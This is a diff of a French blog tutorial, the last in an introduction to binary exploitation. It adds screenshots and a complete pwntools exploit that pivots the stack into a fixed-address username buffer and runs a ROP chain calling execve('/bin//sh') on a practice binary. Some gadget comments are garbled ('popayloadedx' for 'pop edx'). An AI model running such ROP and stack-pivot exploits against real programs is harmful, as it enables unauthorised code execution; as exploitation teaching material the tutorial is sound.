@@ -2,6 +2,7 @@
 author: "Laluka"
 title: "PWN 4/4 : Stack Pivot ToZeMoon !"
 date: 2018-05-10
+description: "Les bases de l'exploitation binaires sont normalement acquises, c'est parti pour une exploitation pratique d'un stack pivot !"
 ---
 
 Bienvenue pour ce 4ème et dernier article d'introduction au pwn.
@@ -12,9 +13,15 @@ L'exploit ne sera pas très long, mais en prévision : Une technique sympa, du r
 
 Vous qui avez tenu les 3 articles précédents, j'espère que vous êtes toujours chauds !
 
+<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/lets_go.jpg" alt="lets_go" >
+
 Top départ : Reconnaissance !
 
+Le binaire étudié est téléchargable [ici](/hacking/pwn_4of4_stack_pivot/vuln) !
+
 Bonjour petit programme, que fais-tu dans la vie ?
+
+<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/recon.png" alt="recon" >
 
 Meh, not much...
 
@@ -32,7 +39,9 @@ Il est bourré d'easter eggs, si vous avez du temps à perdre, enjoy ! ;)
 
 Je sais que le screen est difficilement lisible en taille normal, mais j'ai mis la résolution source, et j'ai check sur tel et pc, en zoomant c'est pixel-perfect !
 
-Deso / Pas deso, il faut voir plus gros ! ¯\_(ツ)_/¯
+Deso / Pas deso, il faut voir plus gros ! `¯\_(ツ)_/¯`
+
+<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/cutter.png" alt="cutter" >
 
 Présentation brève de l'interface :
 
@@ -52,9 +61,15 @@ Si ce n'est pas classe toutes ces infos d'un claquement de doigt !
 
 Mais là... Vous auriez déjà du tilter... :x
 
+<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/ffs.jpg" alt="ffs" >
+
 Petit apercu du flot d'exécution (à partir du main), toujours via Cutter :
 
+<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/graph_call.png" alt="graph_call" >
+
 Un peu la flemme d'analyser ca en profondeur... Pseudo code s'il vous plaît ?
+
+<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pseudo_code.png" alt="pseudo_code" >
 
 On voit tout de suite que la décompilation est partielle, on voit plein de choses intéressantes, mais on n'a pas un code C clair comme on aimerait... Bah on va faire avec !
 
@@ -72,6 +87,8 @@ Sinks : scanf... scanf ? scanf !
 
 scanf correspond à "room name". On fait un ou deux essais quand même pour être sûr de contrôler le point de crash :
 
+<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/crash.png" alt="crash" >
+
 Point de crash confirmé !
 
 Avant de chercher l'offset, il y a une chose supplémentaire à repérer, qui nous servira >PEUT ÊTREEEEE< par la suite... Je dis ca je dis rien... Pour les chercheurs, c'est dans le premier screenshot de code, pour les autres, la lecture continue :
@@ -82,11 +99,15 @@ On lit le code suivant :
 
 push 0x3ff // taille : 1023
 
-push obj.username // adresse : 0x80eb2c0 char *fgets(...) // saisie utilisateur
+push obj.username // adresse : 0x80eb2c0 char * fgets(...) // saisie utilisateur
 
 Autrement dit, le programme va toujours mettre au même endroit (0x80eb2c0) jusqu'à 1023 bytes saisis par l'utilisateur... Ca peut se justifier... Mais ca peut être utile non ? Who knows ! :)
 
 Maintenant, l'offset !
+
+<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_create.png" alt="pattern_create" >
+
+<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_search.png" alt="pattern_search" >
 
 On crash sur un ret : Habituel, classique, cool.
 
@@ -98,6 +119,8 @@ Cela signifie qu'entre le moment où on overflow, et le moment où on exécute l
 
 Mais... On a ESP + 4 ? Oui. On sait faire une addition ? Oui.
 
+<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/coincidence.gif" alt="coincidence" >
+
 Vous commencez, je l'espère, à voir où je veux en venir ? :)
 
 On sait où stocker des bytes. On contrôle EIP vu qu'on contrôle ESP sur un ret. On connaît l'offset, et on sait comment modifier ESP pour qu'il prenne la valeur de notre choix... Yapluka !
@@ -108,9 +131,67 @@ On va faire pivoter l'exécution de notre programme, en lui faisant croire que l
 
 Je passe la préparation de la ropchain car c'est exactement comme dans l'article précédent, on va tout de suite faire notre exploit :
 
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+
+# Setting up
+context.log_level = "debug"
+
+ropchain = ''
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea340)  # @ .data
+ropchain += p32(0x080bb696)  # popayloadeax ; ret
+ropchain += '/bin'
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea344)  # @ .data + 4
+ropchain += p32(0x080bb696)  # popayloadeax ; ret
+ropchain += '//sh'
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x080545b0)  # xor eax, eax ; ret
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x080481a9)  # popayloadebx ; ret
+ropchain += p32(0x080ea340)  # @ .data
+ropchain += p32(0x080c18cc)  # popayloadecx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x080545b0)  # xor eax, eax ; ret
+ropchain += p32(0x0807b64f) * 11 # inc eax ; ret
+ropchain += p32(0x080494b1)  # int 0x80
+
+p = process("./vuln")
+p.recv()
+p.sendline(ropchain)
+p.recv()
+"""
+0x08048fc9 <+397>:	lea    esp,[ecx-0x4]
+0x08048fcc <+400>:	ret
+On ajoute donc 4 a user name pour compenser le -0x4
+"""
+usernameAddr = 0x80EB2C0
+ESP = usernameAddr + 4 # Fix the offset before ret
+p.sendline("1" * 28 + p32(ESP))
+p.recv()
+p.sendline("10")
+p.recv()
+p.interactive()
+```
+
 On le lance, ce serait quand même fou que ca fonctionne du premier coup non ? :O
 
+<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/run_exploit.png" alt="run_exploit" >
+
 Bim, shell, first try, too IZI mannnn !
+
+<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/like_a_boss.jpg" alt="like_a_boss" >
 
 Sauf que... Sauf que non.
 
@@ -126,10 +207,4 @@ C'est ainsi que se conclu cette introduction au pwn, j'espère qu'elle vous a pl
 
 Vos nombreux retours me font très très plaisir, merci ! ^.^
 
-Pour ceux qui veulent donner un coup de pouce, le mieux reste le partage du blog : thinkloveshare.blogspot.com
-
-Et pour ceux qui veulent suivre les prochaines sorties (SPOIL : qui seront bien moins fréquentes que ces 4 articles...), follow le twitter des familles : https://twitter.com/TheLaluka
-
-En vous souhaitant une agréable journée, et un bon pwn,
-
--Laluka
+En vous souhaitant un pwn heureux,
